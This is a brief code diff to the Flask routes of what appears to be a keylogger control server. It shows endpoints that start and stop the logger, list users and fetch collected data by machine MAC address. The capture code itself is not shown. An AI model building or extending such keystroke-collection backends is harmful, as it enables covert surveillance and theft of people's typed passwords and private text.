@@ -12,6 +12,8 @@ app_routes = Blueprint("app_routes", __name__)
 def start_keylogger():
     return start_listening()
 
+
+
 @app_routes.route("/stop_keylogger", methods=["POST"])
 def stop_keylogger():
     return stop_listening()
@@ -30,12 +32,17 @@ def index():
 
 
 
-@app_routes.route("/users", methods=["GET", "POST"])
+@app_routes.route("/get_users", methods=["GET"])
 def users():
    return get_users()
 
 
 
+ 
+
+@app_routes.route("/get_data_by_mac", methods=["GET"])
+def get_data():
+    return get_data_by_mac()
 
 @app_routes.route("/get_data", methods=["GET"])
 def get():
